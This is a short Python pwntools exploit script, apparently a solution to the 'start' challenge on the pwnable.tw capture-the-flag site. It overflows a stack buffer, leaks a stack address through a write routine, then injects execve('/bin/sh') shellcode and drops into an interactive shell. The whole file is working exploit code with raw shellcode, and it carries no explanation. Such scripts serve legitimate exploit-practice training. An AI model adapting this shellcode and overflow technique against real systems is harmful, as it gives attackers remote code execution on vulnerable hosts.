from pwn import *
#context.log_level = "debug"

#HOST = "localhost"
HOST = "chall.pwnable.tw"
#PORT = 4444
PORT = 10000

s = remote(HOST, PORT)

elf = ELF("./start")
#libc = ELF("./")
pause()

main_addr = 0x08048060
func_write = 0x08048087

shell = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
shell += "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99"
shell += "\xb0\x0b\xcd\x80"

dummy = "A"*20

payload = dummy
payload += p32(func_write)

s.recvuntil("Let's start the CTF:")
s.send(payload)

stack_addr = u32(s.recv(4))
s.recv()
print "[*] stack_addr : " + hex(stack_addr)

payload = dummy
payload += p32(stack_addr + 0x14)
payload += shell

s.send(payload)

s.interactive()